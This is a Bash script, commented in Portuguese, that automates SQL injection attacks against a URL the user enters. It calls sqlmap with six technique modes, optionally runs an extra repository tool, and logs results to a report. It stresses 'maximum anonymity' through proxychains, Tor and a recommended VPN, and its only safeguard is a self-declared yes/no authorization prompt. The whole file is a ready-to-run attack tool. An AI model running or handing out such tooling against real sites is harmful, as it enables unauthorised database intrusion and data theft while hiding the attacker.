#!/bin/bash
# SQL Injection Automation Script
# Foco: Máximo anonimato, logs, relatórios, integração com Kali e scripts do repositório

RESULT_DIR="$(dirname "$0")/result"
LOG_DIR="$RESULT_DIR/logs"
RELATORIO_DIR="$RESULT_DIR/relatorio"
RELATORIO_FILE="$RELATORIO_DIR/relatorio_$(date +%Y%m%d_%H%M%S).txt"

# Função para checar root
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo "[ERRO] Rode como root!" | tee -a "$LOG_DIR/error.log"
        exit 1
    fi
}

# Função para OPSEC básica
opsec_check() {
    echo "[OPSEC] Checando anonimato..." | tee -a "$LOG_DIR/opsec.log"
    if command -v proxychains4 >/dev/null 2>&1; then
        echo "[OPSEC] Proxychains encontrado. Usando proxychains para anonimato." | tee -a "$LOG_DIR/opsec.log"
        PROXY="proxychains4"
    else
        echo "[OPSEC] Proxychains NÃO encontrado. Recomenda-se instalar e configurar para anonimato." | tee -a "$LOG_DIR/opsec.log"
        PROXY=""
    fi
    if command -v tor >/dev/null 2>&1; then
        echo "[OPSEC] Tor encontrado. Certifique-se que está rodando." | tee -a "$LOG_DIR/opsec.log"
    else
        echo "[OPSEC] Tor NÃO encontrado. Recomenda-se instalar para anonimato." | tee -a "$LOG_DIR/opsec.log"
    fi
    echo "[OPSEC] Recomenda-se uso de VPN antes de iniciar o ataque." | tee -a "$LOG_DIR/opsec.log"
}

# Pergunta sobre autorização legal
read -p "Você tem autorização legal para realizar este teste? (s/n): " AUTORIZACAO
if [[ ! "$AUTORIZACAO" =~ ^[sS]$ ]]; then
    echo "[ERRO] Autorização legal é obrigatória. Abortando." | tee -a "$LOG_DIR/error.log"
    exit 1
fi

# Pergunta nome do operador
read -p "Digite o nome do operador: " OPERADOR

# Salva informações iniciais no relatório
mkdir -p "$RELATORIO_DIR"
echo "Relatório de SQL Injection" > "$RELATORIO_FILE"
echo "Data: $(date)" >> "$RELATORIO_FILE"
echo "Operador: $OPERADOR" >> "$RELATORIO_FILE"
echo "Autorização legal: SIM" >> "$RELATORIO_FILE"
echo "----------------------------------------" >> "$RELATORIO_FILE"

# Checagens iniciais
check_root
opsec_check

# Função para executar sqlmap
run_sqlmap() {
    local url="$1"
    local mode="$2"
    local extra="$3"
    local log="$LOG_DIR/sqlmap_${mode}.log"
    echo "[+] Rodando sqlmap ($mode) em $url" | tee -a "$RELATORIO_FILE"
    $PROXY sqlmap -u "$url" $extra --batch --output-dir="$RESULT_DIR" | tee -a "$log"
}

# Função para executar outros scripts do repositório (exemplo)
run_custom_scripts() {
    # Exemplo: rodar script customizado se existir
    if [ -f "../Ferramentas/SQLCustomTool/sql_custom.sh" ]; then
        echo "[+] Rodando SQLCustomTool" | tee -a "$RELATORIO_FILE"
        $PROXY bash ../Ferramentas/SQLCustomTool/sql_custom.sh | tee -a "$LOG_DIR/sqlcustom.log"
    fi
}

# Entrada do alvo
read -p "Digite a URL vulnerável para testar SQLi: " TARGET_URL
if [[ -z "$TARGET_URL" ]]; then
    echo "[ERRO] URL inválida." | tee -a "$LOG_DIR/error.log"
    exit 1
fi

# Menu interativo de técnicas
echo "Escolha as técnicas de SQLi a serem testadas (separe por espaço):"
echo "1) Error-Based"
echo "2) Union-Based"
echo "3) Boolean-Based"
echo "4) Time-Based"
echo "5) OOB"
echo "6) Second-Order"
read -p "Digite os números das técnicas (ex: 1 2 3): " TECNICAS

for t in $TECNICAS; do
    case $t in
        1)
            run_sqlmap "$TARGET_URL" "error-based" "--technique=E"
            ;;
        2)
            run_sqlmap "$TARGET_URL" "union-based" "--technique=U"
            ;;
        3)
            run_sqlmap "$TARGET_URL" "boolean-based" "--technique=B"
            ;;
        4)
            run_sqlmap "$TARGET_URL" "time-based" "--technique=T"
            ;;
        5)
            run_sqlmap "$TARGET_URL" "oob" "--technique=O"
            ;;
        6)
            read -p "Digite a URL de segunda ordem (ou deixe vazio): " SECOND_URL
            if [ -n "$SECOND_URL" ]; then
                run_sqlmap "$TARGET_URL" "second-order" "--second-order=$SECOND_URL"
            else
                echo "[INFO] Técnica second-order ignorada (sem URL)." | tee -a "$RELATORIO_FILE"
            fi
            ;;
        *)
            echo "[WARN] Técnica desconhecida: $t" | tee -a "$RELATORIO_FILE"
            ;;
    esac
done

# Rodar scripts customizados do repositório
run_custom_scripts

echo "[+] Ataques finalizados. Resultados e logs em $RESULT_DIR" | tee -a "$RELATORIO_FILE"
